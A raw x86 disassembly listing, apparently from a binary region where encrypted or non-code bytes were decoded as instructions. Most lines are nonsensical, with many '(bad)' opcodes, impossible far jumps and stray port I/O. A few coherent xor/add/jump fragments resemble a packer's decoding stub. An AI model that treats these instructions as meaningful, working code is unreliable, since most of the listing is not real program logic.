  4166a9:	mov    esp,0x55bd4abb
  4166ae:	shl    edi,1
  4166b0:	cdq    
  4166b1:	pop    ebp
  4166b2:	push   ebx
  4166b3:	or     BYTE PTR [ecx],dl
  4166b5:	sar    BYTE PTR [ebx+0x4e],0x47
  4166b9:	outs   dx,DWORD PTR ds:[esi]
  4166ba:	mov    DWORD PTR [ebp+0x4d09307c],ebx
  4166c0:	mov    esi,DWORD PTR [eax]
  4166c2:	jp     0x416713
  4166c4:	sti    
  4166c5:	push   cs
  4166c6:	adc    BYTE PTR fs:0x48f76270,dl
  4166cd:	push   es
  4166ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166cf:	push   0xbf722c01
  4166d4:	xor    BYTE PTR [edx+0x3af449f6],bh
  4166da:	sub    edi,ebp
  4166dc:	(bad)
  4166df:	rcr    BYTE PTR [edi+eiz*4],1
  4166e2:	cld    
  4166e3:	push   ecx
  4166e4:	popa   
  4166e5:	add    BYTE PTR [edx+0x5e8f476f],ah
  4166eb:	add    DWORD PTR [ebp+0x78407162],eax
  4166f1:	dec    esi
  4166f2:	jmp    0x43b491e0
  4166f7:	jle    0x4166b5
  4166f9:	inc    edi
  4166fa:	test   al,0xf9
  4166fc:	jmp    DWORD PTR [eax]
  4166fe:	inc    ecx
  4166ff:	clc    
  416700:	or     eax,ebp
  416702:	test   DWORD PTR [ecx+edi*4],ebp
  416705:	(bad)  
  416706:	imul   esi,DWORD PTR [ebx-0x62d94e95],0xab037f88
  416710:	rcr    edi,0x6d
  416713:	sbb    al,0xae
  416715:	loope  0x416724
  416717:	dec    esi
  416718:	jne    0x4166ec
  41671a:	outs   dx,BYTE PTR ds:[esi]
  41671b:	jnp    0x41674a
  41671d:	jmp    0x4ef74c3b
  416722:	fdiv   QWORD PTR [esi+0x3d59fd48]
  416728:	xchg   ecx,eax
  416729:	xor    esi,DWORD PTR [edx]
  41672b:	inc    edi
  41672c:	mov    edi,0xf8b78909
  416731:	adc    DWORD PTR [ebp+0x1d],edx
  416734:	test   BYTE PTR [ebx],ch
  416736:	push   ds
  416737:	mov    dl,0x14
  416739:	add    ah,ch
  41673b:	stc    
  41673c:	mov    ch,0x9b
  41673e:	mov    ds:0x63d9f9e3,eax
  416743:	adc    BYTE PTR [edi-0x21],bl
  416746:	pop    es
  416747:	js     0x41677f
  416749:	fcomp  QWORD PTR [eax]
  41674b:	push   esp
  41674c:	sahf   
  41674d:	(bad)  
  41674e:	fnstenv [ebx+0x1cb32fd2]
  416754:	mov    eax,0x4adce4f5
  416759:	or     bh,bl
  41675b:	add    al,0xba
  41675d:	enter  0x5634,0x3
  416761:	in     al,0x3f
  416763:	(bad)  
  416764:	ds jp  0x4167df
  416767:	stos   BYTE PTR es:[edi],al
  416768:	jge    0x41672e
  41676a:	xor    ch,BYTE PTR [esi+0x2ece3066]
  416770:	mov    ah,0x84
  416772:	les    ecx,FWORD PTR [esi-0x2e]
  416775:	and    al,0x73
  416777:	jmp    0x416715
  416779:	loope  0x4167d1
  41677b:	pop    ds
  41677c:	push   ebp
  41677d:	lods   eax,DWORD PTR ds:[esi]
  41677e:	xchg   ecx,eax
  41677f:	fs stos DWORD PTR es:[edi],eax
  416781:	call   0xd29f70c0
  416786:	loopne 0x41679a
  416788:	(bad)  
  416789:	fld    QWORD PTR [esp+eax*1-0x13bc572e]
  416790:	add    BYTE PTR [edx-0x51],bh
  416793:	sub    eax,0x89f0ca74
  416798:	or     al,0xe0
  41679a:	jmp    0xf33b:0xa3e2cb60
  4167a1:	add    al,0x42
  4167a3:	cdq    
  4167a4:	push   ecx
  4167a5:	mov    ecx,DWORD PTR fs:[ebx]
  4167a8:	cmp    BYTE PTR [eax+0x3b],dh
  4167ab:	arpl   WORD PTR [esi],sp
  4167ad:	xchg   ch,dl
  4167af:	push   es
  4167b0:	push   bx
  4167b2:	inc    eax
  4167b3:	rcr    ebx,cl
  4167b5:	mov    edi,0xa84a445a
  4167ba:	xchg   edi,eax
  4167bb:	fisub  WORD PTR [edx]
  4167bd:	xchg   ecx,eax
  4167be:	pop    esp
  4167bf:	cmp    DWORD PTR [ebx+eax*2+0x1],eax
  4167c3:	das    
  4167c4:	(bad)  
  4167c5:	stc    
  4167c6:	dec    ebp
  4167c7:	cmp    bl,BYTE PTR [edi-0x72e406cc]
  4167cd:	jb     0x416792
  4167cf:	imul   ecx,DWORD PTR [ecx-0xe],0x18
  4167d3:	fistp  DWORD PTR [eax]
  4167d5:	sbb    eax,0x52fdc874
  4167da:	jno    0x416853
  4167dc:	std    
  4167dd:	cmp    al,BYTE PTR [eax-0x12]
  4167e0:	mov    eax,0x1f9e574
  4167e5:	(bad)  
  4167e6:	xor    BYTE PTR [ebx-0x2d30434c],bl
  4167ec:	add    esp,edi
  4167ee:	rcl    al,0x54
  4167f1:	pop    esp
  4167f2:	nop
  4167f3:	js     0x416868
  4167f5:	retf   
  4167f6:	popf   
  4167f7:	dec    eax
  4167f8:	bnd jnp 0x416793
  4167fb:	jae    0x416866
  4167fd:	mov    DWORD PTR [ecx],eax
  4167ff:	mov    eax,DWORD PTR [ebp-0x8]
  416802:	jmp    0x41731f
  416807:	jmp    0x416abf
  41680c:	ds rcl esi,1
  41680f:	int3   
  416810:	(bad)  
  416812:	retf   0x7ed1
  416815:	xchg   ebx,eax
  416816:	aam    0x3d
  416818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416819:	std    
  41681a:	sub    al,0xe4
  41681c:	jbe    0x416841
  41681e:	jg     0x416898
  416820:	xchg   ebp,eax
  416821:	jle    0x41689b
  416823:	js     0x4167db
  416825:	adc    al,0xc2
  416827:	and    al,0x11
  416829:	jmp    0x3614:0xff29cdd
  416830:	pushf  
  416831:	lahf   
  416832:	mov    ch,BYTE PTR [eax+0x706e6d36]
  416838:	sub    BYTE PTR [edx+0x4d],ah
  41683b:	xor    DWORD PTR [ebx-0x5f],ecx
  41683e:	nop
  41683f:	cli    
  416840:	out    0xa,eax
  416842:	mov    bh,0xd
  416844:	xchg   edi,eax
  416845:	push   edi
  416846:	leave  
  416847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416848:	call   0xf9ad:0xc769688c
  41684f:	jecxz  0x41680e
  416851:	add    BYTE PTR [esi-0x63],ah
  416854:	xlat   BYTE PTR ds:[ebx]
  416855:	addr16 jbe 0x41684e
  416858:	imul   esi,DWORD PTR [ecx],0xffffffc4
  41685b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41685c:	adc    BYTE PTR [eax-0x2aabda30],dh
  416862:	jne    0x416861
  416864:	mov    dl,ch
  416866:	addr16 dec eax
  416868:	scas   eax,DWORD PTR es:[edi]
  416869:	jns    0x416859
  41686b:	jbe    0x416801
  41686d:	scas   eax,DWORD PTR es:[edi]
  41686e:	push   esp
  41686f:	in     al,dx
  416870:	inc    esi
  416871:	adc    al,0x84
  416873:	rcl    BYTE PTR [ebx-0x1e3a53b8],cl
  416879:	sti    
  41687a:	pop    esi
  41687b:	dec    ebx
  41687c:	clc    
  41687d:	ja     0x41686d
  41687f:	push   ebp
  416880:	outs   dx,DWORD PTR ds:[esi]
  416881:	inc    edi
  416882:	mov    ebp,ebp
  416884:	inc    edi
  416885:	fsub   DWORD PTR [esi-0x20e78a77]
  41688b:	data16 jge 0x416823
  41688e:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  416890:	push   ss
  416891:	jge    0x41681b
  416893:	adc    eax,0xcc6e6d6f
  416898:	inc    ebp
  416899:	add    al,BYTE PTR [eax-0x5b2bf6c]
  41689f:	int3   
  4168a0:	push   eax
  4168a1:	push   esp
  4168a2:	pop    es
  4168a3:	push   cs
  4168a4:	fwait
  4168a5:	xchg   edi,eax
  4168a6:	dec    BYTE PTR [edi]
  4168a8:	add    DWORD PTR [esi-0x54],esi
  4168ab:	or     BYTE PTR [ebx+0x5d4fb38a],0x75
  4168b2:	rcr    BYTE PTR [ebx-0x7b],1
  4168b5:	das    
  4168b6:	mov    bh,0x24
  4168b8:	jb     0x4168fd
  4168ba:	(bad)  [ebx-0x7ccded73]
  4168c0:	cdq    
  4168c1:	in     eax,dx
  4168c2:	frstor [edx-0x39]
  4168c5:	mov    esi,0x53d35a96
  4168ca:	out    0x19,al
  4168cc:	xor    DWORD PTR [ebp+0x31],ebp
  4168cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168d0:	std    
  4168d1:	adc    DWORD PTR ds:0x1eb38ee1,0xffffff84
  4168d8:	lods   al,BYTE PTR ds:[esi]
  4168d9:	jae    0x416912
  4168db:	dec    esp
  4168dc:	mov    ch,0x4d
  4168de:	or     eax,0x16d67aaf
  4168e3:	push   ebx
  4168e4:	shr    DWORD PTR [esi+0x3aed55ec],cl
  4168ea:	sub    al,0xff
  4168ec:	dec    edx
  4168ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168ee:	fst    QWORD PTR [edx+0x69]
  4168f1:	enter  0x8436,0xf7
  4168f5:	dec    DWORD PTR [eax-0x26]
  4168f8:	fnstsw WORD PTR [edi]
  4168fa:	test   DWORD PTR [eax+ecx*8-0x68709cf1],ecx
  416901:	sub    edi,DWORD PTR [ebp+0x29]
  416904:	aas    
  416905:	xchg   DWORD PTR [ebx-0x4f7526f3],ecx
  41690b:	cs xchg ebp,eax
  41690d:	or     DWORD PTR [esi+0xdefb2ae],ebp
  416913:	xchg   al,ch
  416915:	test   al,0x73
  416917:	and    BYTE PTR [ecx-0x2b],0x9e
  41691b:	sub    ah,BYTE PTR [edx-0x67]
  41691e:	imul   esi,ecx,0xb5d4535e
  416924:	inc    ebx
  416925:	sub    ah,BYTE PTR [esi]
  416927:	inc    ebp
  416928:	in     eax,dx
  416929:	dec    esp
  41692a:	jge    0x41698d
  41692c:	inc    edx
  41692d:	in     al,0x16
  41692f:	cmp    ebx,edi
  416931:	fstp   st(4)
  416933:	adc    edi,DWORD PTR [ecx+0x2ae3acab]
  416939:	ficom  WORD PTR [edx]
  41693b:	sbb    DWORD PTR [ebp+0x1472fa7b],edi
  416941:	ds out dx,eax
  416943:	push   ds
  416944:	and    dh,dh
  416946:	(bad)  
  416947:	pop    esi
  416948:	outs   dx,DWORD PTR ds:[esi]
  416949:	jae    0x41696b
  41694b:	fsub   DWORD PTR [esi+0x7ee00b2c]
  416951:	in     eax,dx
  416952:	aad    0x9c
  416954:	dec    edi
  416955:	or     BYTE PTR [ecx+0x3fe0d803],ah
  41695b:	inc    ebp
  41695c:	in     eax,0x15
  41695e:	sbb    BYTE PTR ds:0x4621dfbb,0xa9
  416965:	stos   BYTE PTR es:[edi],al
  416966:	xlat   BYTE PTR ds:[ebx]
  416967:	mov    eax,0x78cc3441
  41696c:	dec    esp
  41696d:	loopne 0x416947
  41696f:	push   es
  416970:	sub    BYTE PTR [ebx+0x5d],0xef
  416974:	pop    edi
  416975:	jno    0x41698c
  416977:	jp     0x416987
  416979:	repnz (bad) 
  41697b:	punpckhbw mm4,QWORD PTR [ecx-0x4e3af43a]
  416982:	push   ecx
  416983:	mul    DWORD PTR [ebx-0xe1135df]
  416989:	stos   BYTE PTR es:[edi],al
  41698a:	leave  
  41698b:	(bad)
  41698f:	sub    al,0x35
  416991:	test   al,0x4d
  416993:	sahf   
  416994:	and    DWORD PTR [edx-0x22],edi
  416997:	cli    
  416998:	or     bh,BYTE PTR [ecx+esi*8+0x64f46e60]
  41699f:	xchg   BYTE PTR ds:0x312721c2,cl
  4169a5:	loopne 0x4169c5
  4169a7:	or     eax,0x63f756a6
  4169ac:	(bad)  
  4169ad:	retf   0xf3dd
  4169b0:	sub    ecx,DWORD PTR ds:0x303cb642
  4169b6:	fimul  DWORD PTR [ebx]
  4169b8:	nop
  4169b9:	pop    ebp
  4169ba:	sbb    eax,0xd34e0091
  4169bf:	cwde   
  4169c0:	and    esi,DWORD PTR [edi+eiz*8]
  4169c3:	inc    eax
  4169c4:	mov    esi,0xe8324669
  4169c9:	mov    WORD PTR [esi],fs
  4169cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169cc:	out    dx,eax
  4169cd:	into   
  4169ce:	not    DWORD PTR [ecx]
  4169d0:	outs   dx,DWORD PTR ds:[esi]
  4169d1:	jmp    0x416995
  4169d3:	add    eax,0x5faf0b66
  4169d8:	inc    eax
  4169d9:	int    0x47
  4169db:	in     al,dx
  4169dc:	fadd   QWORD PTR [ebx]
  4169de:	inc    eax
  4169df:	xchg   esp,eax
  4169e0:	xchg   esp,eax
  4169e1:	out    dx,al
  4169e2:	loope  0x4169a6
  4169e4:	popf   
  4169e5:	add    al,0x9f
  4169e7:	pop    es
  4169e8:	cwde   
  4169e9:	in     al,dx
  4169ea:	jnp    0x4169bc
  4169ec:	jbe    0x4169f3
  4169ee:	ret    
  4169ef:	adc    al,0xb6
  4169f1:	cmp    eax,0xe51d7a38
  4169f6:	mov    WORD PTR ds:0xde11e444,?
  4169fc:	mov    ebx,0x8a3626cd
  416a01:	pop    ecx
  416a02:	mov    ds:0x28ac8068,al
  416a07:	add    eax,0xbf246478
  416a0c:	je     0x4169d8
  416a0e:	xchg   ecx,eax
  416a0f:	sbb    edx,esp
  416a11:	mov    bh,0xc
  416a13:	jl     0x416a69
  416a15:	adc    eax,esp
  416a17:	dec    edi
  416a18:	inc    esi
  416a19:	push   es
  416a1a:	leave  
  416a1b:	inc    esi
  416a1c:	retf   0xd5b0
  416a1f:	mov    dl,0xe8
  416a21:	inc    ecx
  416a22:	jns    0x416a50
  416a24:	fdiv   QWORD PTR ds:0xdaa54359
  416a2a:	sbb    bh,BYTE PTR [edi-0x6d8d42a1]
  416a30:	mov    WORD PTR [edi],gs
  416a32:	xchg   ecx,eax
  416a33:	adc    al,0xd4
  416a35:	jmp    0xe11a:0xe132ffe
  416a3c:	jae    0x4169fc
  416a3e:	mov    al,0x67
  416a40:	ret    
  416a41:	push   edi
  416a42:	imul   edx,DWORD PTR [edx],0x62
  416a45:	pop    ecx
  416a46:	jmp    0xa5eb97ff
  416a4b:	pop    esp
  416a4c:	xchg   ebp,eax
  416a4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a4e:	outs   dx,BYTE PTR ds:[esi]
  416a4f:	fdivr  st,st(1)
  416a51:	stc    
  416a52:	sub    al,0xb3
  416a54:	xchg   esi,edi
  416a56:	pushf  
  416a57:	out    0x55,eax
  416a59:	add    al,0x70
  416a5b:	lea    edi,[ebp+0x23]
  416a5e:	loop   0x416a6c
  416a60:	mov    eax,0x9ba2cf07
  416a65:	jns    0x416a7a
  416a67:	or     edi,esi
  416a69:	pop    esi
  416a6a:	or     eax,0xb90e46c1
  416a6f:	mov    ah,0xe5
  416a71:	cmc    
  416a72:	and    dl,BYTE PTR [esi-0xeca9805]
  416a78:	add    eax,0x8948b7a
  416a7d:	xchg   ebp,eax
  416a7e:	arpl   WORD PTR [edi-0x5b],ax
  416a81:	add    esp,DWORD PTR [ebp+0x1c]
  416a84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a86:	jle    0x416a29
  416a88:	lods   al,BYTE PTR ds:[esi]
  416a89:	(bad)
  416a8c:	repz xchg esp,eax
  416a8e:	and    DWORD PTR [ecx-0x76],ecx
  416a91:	jmp    0xfb4f321a
  416a96:	lea    esi,[ebp*8+0x39e42c4a]
  416a9d:	or     al,0xcd
  416a9f:	int    0x66
  416aa1:	out    dx,eax
  416aa2:	inc    ebp
  416aa3:	pop    eax
  416aa4:	jnp    0x416aee
  416aa6:	mov    DWORD PTR [edi+0x48f3817a],edx
  416aac:	or     dl,al
  416aae:	aas    
  416aaf:	and    al,0x28
  416ab1:	fnstenv [edi]
  416ab3:	inc    edi
  416ab4:	mov    bh,0x5e
  416ab6:	out    dx,al
  416ab7:	adc    BYTE PTR [ebx+0x15],bh
  416aba:	test   al,0x8f
  416abc:	ja     0x416a78
  416abe:	dec    edx
  416abf:	mov    eax,DWORD PTR [ebp-0x4]
  416ac2:	jmp    0x416d7a
  416ac7:	rol    dl,1
  416ac9:	(bad)  
  416aca:	iret   
  416acb:	fcmovbe st,st(5)
  416acd:	fcmovne st,st(1)
  416acf:	mov    eax,0x1864ff75
  416ad4:	jnp    0x416b42
  416ad6:	pushf  
  416ad7:	xchg   ebx,eax
  416ad8:	and    BYTE PTR [edi+0x78],bh
  416adb:	xchg   ebp,eax
  416adc:	jle    0x416b56
  416ade:	js     0x416b3b
  416ae0:	sbb    eax,0x806eff87
  416ae5:	out    dx,eax
  416ae6:	in     eax,dx
  416ae7:	and    edx,DWORD PTR [ebp+0x378683bc]
  416aed:	jne    0x416b6d
  416aef:	mov    dh,0xd3
  416af1:	mov    bh,0xea
  416af3:	int3   
  416af4:	add    al,0xce
  416af6:	cmp    eax,ebp
  416af8:	(bad)  
  416af9:	mul    DWORD PTR [ecx]
  416afb:	cmp    ch,bh
  416afd:	shl    DWORD PTR [eax],0xdd
  416b00:	push   cs
  416b01:	cdq    
  416b02:	nop    DWORD PTR [ebx-0x65]
  416b06:	xchg   edx,eax
  416b07:	into   
  416b08:	push   eax
  416b09:	cmp    eax,0xff4dce5f
  416b0e:	sub    DWORD PTR ds:0xdfcdc3b2,0xfffffff3
  416b15:	(bad)  
  416b16:	stc    
  416b17:	scas   al,BYTE PTR es:[edi]
  416b18:	inc    esi
  416b19:	mov    ?,eax
  416b1b:	aam    0x1c
  416b1d:	outs   dx,DWORD PTR ds:[esi]
  416b1e:	ret    0x2b2c
  416b21:	in     eax,0x66
  416b23:	(bad)  
  416b24:	loopne 0x416b82
  416b26:	fistp  WORD PTR [edx+0x60]
  416b29:	sub    BYTE PTR [edi+0x75c879c0],ah
  416b2f:	mov    al,0x7f
  416b31:	outs   dx,BYTE PTR ds:[esi]
  416b32:	and    al,0x9b
  416b34:	loopne 0x416af2
  416b36:	sub    al,0xc5
  416b38:	push   edx
  416b39:	sahf   
  416b3a:	inc    ebx
  416b3b:	(bad)  
  416b3c:	call   0x69dd51c6
  416b41:	jne    0x416b79
  416b43:	jmp    0x416ba2
  416b45:	daa    
  416b46:	add    ebx,DWORD PTR [ecx+0x12]
  416b49:	inc    ebp
  416b4a:	bnd jne 0x416b04
  416b4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b4e:	rol    BYTE PTR [ebx],cl
  416b50:	pop    esi
  416b51:	(bad)  
  416b52:	dec    esp
  416b53:	dec    ebx
  416b54:	inc    ecx
  416b55:	rol    eax,cl
  416b57:	push   edi
  416b58:	xor    BYTE PTR [ebx-0x6b2081e4],al
  416b5e:	sbb    eax,0x2a69d990
  416b63:	cmp    al,0x15
  416b65:	leave  
  416b66:	pop    ds
  416b67:	adc    BYTE PTR [esi+0x27f57965],ch
  416b6d:	mov    dl,0xa1
  416b6f:	std    
  416b70:	ret    
  416b71:	cmc    
  416b72:	xchg   esi,eax
  416b73:	sahf   
  416b74:	repz jnp 0x416b7a
  416b77:	repz out 0x80,eax
  416b7a:	jbe    0x416b26
  416b7c:	loopne 0x416b29
  416b7e:	sub    eax,0x4d49d128
  416b83:	add    eax,0xe34e3da3
  416b88:	imul   ecx,DWORD PTR [edx+0x1c41a47a],0xf2306fec
  416b92:	or     BYTE PTR [esp+ecx*2],cl
  416b95:	cdq    
  416b96:	mov    bl,0x2f
  416b98:	imul   esi,DWORD PTR [eax+0x14],0x6b
  416b9c:	push   ecx
  416b9d:	dec    ecx
  416b9e:	ficomp WORD PTR [ebx-0x79]
  416ba1:	js     0x416b90
  416ba3:	adc    edi,DWORD PTR [esi-0x598b961a]
  416ba9:	addr16 adc edx,esi
  416bac:	in     eax,0xfd
  416bae:	test   DWORD PTR [eax],edx
  416bb0:	mov    ah,0xe6
  416bb2:	dec    eax
  416bb3:	jmp    0xec0158b2
  416bb8:	pop    eax
  416bb9:	test   al,0x14
  416bbb:	add    al,0x95
  416bbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bbe:	js     0x416be4
  416bc0:	xor    bl,ah
  416bc2:	push   ebp
  416bc3:	jecxz  0x416b50
  416bc5:	ret    0x131e
  416bc8:	sbb    BYTE PTR [edx-0x12ba3d13],cl
  416bce:	push   0xffffffc7
  416bd0:	shl    DWORD PTR [edx],cl
  416bd2:	scas   eax,DWORD PTR es:[edi]
  416bd3:	sub    ecx,DWORD PTR ds:0x7c423b2a
  416bd9:	mov    dh,0x5b
  416bdb:	clc    
  416bdc:	dec    ebx
  416bdd:	sub    DWORD PTR [ebp+0x71],eax
  416be0:	ret    0x5d5c
  416be3:	xor    esi,DWORD PTR [ebx+edx*8+0x4cb85c9d]
  416bea:	jae    0x416c34
  416bec:	adc    BYTE PTR [ebp+0x4ef5f2f5],ah
  416bf2:	push   ds
  416bf3:	pop    esp
  416bf4:	stc    
  416bf5:	lahf   
  416bf6:	mov    al,0x74
  416bf8:	mov    es,WORD PTR [eax+0x7c]
  416bfb:	mov    ebx,0x79b08dc2
  416c00:	jb     0x416c5c
  416c02:	mov    bh,0x9e
  416c04:	dec    edi
  416c05:	call   0x87d2881c
  416c0a:	mov    ebx,ds
  416c0c:	(bad)
  416c11:	push   edx
  416c12:	pop    es
  416c13:	push   edi
  416c14:	lds    eax,FWORD PTR [edx+0x4a91eb57]
  416c1a:	imul   esi,DWORD PTR [ebp+0x24b852e2],0x52
  416c21:	into   
  416c22:	(bad)  
  416c23:	mov    ?,WORD PTR [ecx+esi*4]
  416c26:	ret    0xa701
  416c29:	iret   
  416c2a:	lahf   
  416c2b:	repz ss add al,0x6b
  416c2f:	arpl   WORD PTR ds:0x12554194,bp
  416c35:	pop    edi
  416c36:	and    eax,edx
  416c38:	lahf   
  416c39:	pop    ss
  416c3a:	push   ecx
  416c3b:	dec    eax
  416c3c:	and    esp,DWORD PTR [ebx+0x76]
  416c3f:	pop    esp
  416c40:	push   ds
  416c41:	fbstp  TBYTE PTR [edi+edi*8]
  416c44:	mov    eax,0xc47e6eb7
  416c49:	sbb    al,0x51
  416c4b:	mov    eax,0x7aa8fd35
  416c50:	call   0x665:0x4c38eeb7
  416c57:	jecxz  0x416c0d
  416c59:	repnz in eax,0x3c
  416c5c:	jp     0x416beb
  416c5e:	jecxz  0x416c8d
  416c60:	fld    QWORD PTR ds:0x4d6a083a
  416c66:	jle    0x416c10
  416c68:	and    BYTE PTR [edx*2+0x6a4a6e01],dl
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	fwait
  416c71:	ds popa 
  416c73:	lods   eax,DWORD PTR ds:[esi]
  416c74:	jmp    0x416cc9
  416c76:	xchg   edi,eax
  416c77:	xor    al,0x14
  416c79:	push   ds
  416c7a:	and    al,0x26
  416c7c:	call   0xc0f4:0xec5cb8f4
  416c83:	add    al,0xd4
  416c85:	mov    dl,BYTE PTR [edi+0x607d8e8b]
  416c8b:	enter  0xf270,0xa3
  416c8f:	fild   DWORD PTR [edi+0xd]
  416c92:	test   al,0x6c
  416c94:	pop    esp
  416c95:	pop    edx
  416c96:	push   ebp
  416c97:	jo     0x416cff
  416c99:	or     ebp,DWORD PTR [edi+ecx*2+0x1645f9f]
  416ca0:	mov    esp,DWORD PTR [ebx-0xc]
  416ca3:	or     BYTE PTR [esi+esi*1+0x687ae8fc],al
  416caa:	add    DWORD PTR [esi],ecx
  416cac:	add    esp,DWORD PTR [ebx]
  416cae:	data16 mov ch,0x2b
  416cb1:	or     al,0x4e
  416cb3:	mov    dh,0x4a
  416cb5:	xchg   ecx,eax
  416cb6:	jae    0x416cb2
  416cb8:	push   edi
  416cb9:	lds    ebp,FWORD PTR [edi+0x683a40f8]
  416cbf:	push   ecx
  416cc0:	xchg   eax,eax
  416cc2:	jge    0x416cfc
  416cc4:	jnp    0x416cd7
  416cc6:	sub    ecx,DWORD PTR [esi+ebx*4]
  416cc9:	push   ss
  416cca:	pushf  
  416ccb:	add    eax,0xddc42ff8
  416cd0:	outs   dx,DWORD PTR ds:[esi]
  416cd1:	les    edi,FWORD PTR [ecx]
  416cd3:	ins    BYTE PTR es:[edi],dx
  416cd4:	(bad)  
  416cd5:	in     eax,dx
  416cd6:	jmp    0xda96b6b5
  416cdb:	pop    ds
  416cdc:	sbb    edx,DWORD PTR [eax-0x482af1fb]
  416ce2:	inc    esi
  416ce3:	adc    DWORD PTR [ebx],esi
  416ce5:	add    eax,0x7af3f80c
  416cea:	xchg   BYTE PTR [ebx-0x5b],cl
  416ced:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cee:	xchg   edx,eax
  416cef:	pop    edx
  416cf0:	adc    BYTE PTR [ecx],dl
  416cf2:	int    0x1f
  416cf4:	pop    esp
  416cf5:	adc    al,0x98
  416cf7:	jo     0x416c86
  416cf9:	xor    al,cl
  416cfb:	xlat   BYTE PTR ds:[ebx]
  416cfc:	lahf   
  416cfd:	and    edi,DWORD PTR [edi]
  416cff:	sub    dl,BYTE PTR [edx+ebx*2+0x3a]
  416d03:	sub    BYTE PTR [eax+0x4aa0beaa],0xfb
  416d0a:	xor    eax,0x2a2cfba6
  416d0f:	mov    ecx,0x81562067
  416d14:	xchg   ebx,eax
  416d15:	sti    
  416d16:	xchg   edi,eax
  416d17:	das    
  416d18:	fnstsw WORD PTR [ebx-0x4da1f020]
  416d1e:	sbb    BYTE PTR [ecx+eax*1+0xe],cl
  416d22:	in     al,0xe9
  416d24:	dec    edi
  416d25:	hlt    
  416d26:	xor    al,0xf4
  416d28:	rcr    DWORD PTR [edi],cl
  416d2a:	sahf   
  416d2b:	inc    esi
  416d2c:	jle    0x416ce1
  416d2e:	icebp  
  416d2f:	adc    DWORD PTR [ebx-0x3],ebp
  416d32:	sbb    esi,DWORD PTR [edx+0x54]
  416d35:	mov    bl,0x4c
  416d37:	sbb    eax,0x47e590dd
  416d3c:	dec    ebp
  416d3d:	(bad)  
  416d3e:	rcl    DWORD PTR [ecx+0x4f941531],1
  416d44:	(bad)  
  416d45:	adc    esi,DWORD PTR [ecx]
  416d47:	xor    al,0xca
  416d49:	jo     0x416d27
  416d4b:	lea    esi,[edx-0x64be7fb0]
  416d51:	out    dx,al
  416d52:	xor    al,0xf5
  416d54:	icebp  
  416d55:	pop    ecx
  416d56:	cmp    eax,0xdc6e1716
  416d5b:	push   edi
  416d5c:	gs sbb ah,bh
  416d5f:	mov    ah,0x62
  416d61:	shl    BYTE PTR [edi+0x69b95c22],0xb9
  416d68:	mov    bh,0x57
  416d6a:	int3   
  416d6b:	xchg   ecx,ebx
  416d6d:	and    al,cl
  416d6f:	fwait
  416d70:	sub    esi,DWORD PTR [ebx]
  416d72:	jns    0x416d26
  416d74:	mov    edx,0xa10075a0
  416d79:	mov    DWORD PTR [ebx-0x38ccefb3],ecx
  416d7f:	add    eax,esi
  416d81:	cmp    eax,ecx
  416d83:	jne    0x41731c
  416d89:	mov    eax,DWORD PTR [ebp-0x4]
  416d8c:	xor    eax,edi
  416d8e:	add    eax,esi
  416d90:	mov    ds:0x41eb6a,eax
  416d95:	mov    eax,DWORD PTR [ebp-0x4]
  416d98:	xor    eax,edi
  416d9a:	jmp    0x417052
  416d9f:	xlat   BYTE PTR ds:[ebx]
  416da0:	cmp    eax,0xd9dac7cc
  416da5:	fcmovne st,st(5)
  416da7:	push   ecx
  416da8:	call   0xfb86:0x3f481efb
  416daf:	sub    BYTE PTR ds:0x7e95787f,ah
  416db5:	js     0x416e2f
  416db7:	jmp    DWORD PTR [edx]
  416db9:	and    BYTE PTR [esi-0x65e879ab],0xc0
  416dc0:	adc    esp,DWORD PTR [esi+0x5]
  416dc3:	imul   ebp,DWORD PTR [edi],0x29
  416dc6:	mov    ebx,0x16a367f0
  416dcb:	jmp    0x416e0f
  416dcd:	mov    edx,0x84e77453
  416dd2:	out    0xdf,eax
  416dd4:	icebp  
  416dd5:	xchg   ebp,eax
  416dd6:	push   ecx
  416dd7:	cli    
  416dd8:	clc    
  416dd9:	xchg   ah,bl
  416ddb:	and    edx,DWORD PTR [ebp-0x641827a3]
  416de1:	fwait
  416de2:	jno    0x416e12
  416de4:	ror    DWORD PTR [edi+ebp*2],1
  416de7:	mov    WORD PTR [esi-0x34],fs
  416dea:	call   0xacd22de9
  416def:	ds repz cmc 
  416df2:	pop    edx
  416df3:	and    BYTE PTR [ecx+0x76],0x78
  416df7:	popa   
  416df8:	xlat   BYTE PTR ds:[ebx]
  416df9:	mov    DWORD PTR [edi+0x32],esp
  416dfc:	adc    esp,DWORD PTR [ebp+eiz*4-0x7b]
  416e00:	popf   
  416e01:	push   ebp
  416e02:	(bad)  [eax]
  416e04:	out    dx,eax
  416e05:	sub    BYTE PTR [edx+ebp*8],al
  416e08:	dec    esi
  416e09:	sbb    ebx,eax
  416e0b:	push   ecx
  416e0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e0d:	adc    dl,bl
  416e0f:	jns    0x416e04
  416e11:	out    dx,eax
  416e12:	fstp   QWORD PTR [eax+0xb801534]
  416e18:	xchg   DWORD PTR ss:[ebp-0x5a350082],ecx
  416e1f:	ds jmp 0x416e42
  416e22:	cmp    ah,BYTE PTR [ecx+0x9]
  416e25:	mov    bh,0x89
  416e27:	imul   edx,esi,0x64a6aeca
  416e2d:	pusha  
  416e2e:	stos   DWORD PTR es:[edi],eax
  416e2f:	pushf  
  416e30:	xor    edi,edx
  416e32:	btr    DWORD PTR [edi+0x520aa469],ebx
  416e39:	jb     0x416e13
  416e3b:	fild   DWORD PTR [ecx+edx*1-0x64]
  416e3f:	fst    QWORD PTR [edx+0x3e]
  416e42:	and    eax,0xafc2c0b4
  416e47:	clc    
  416e48:	dec    ecx
  416e49:	add    ebp,DWORD PTR [eax+0xc]
  416e4c:	dec    ebp
  416e4d:	pop    ds
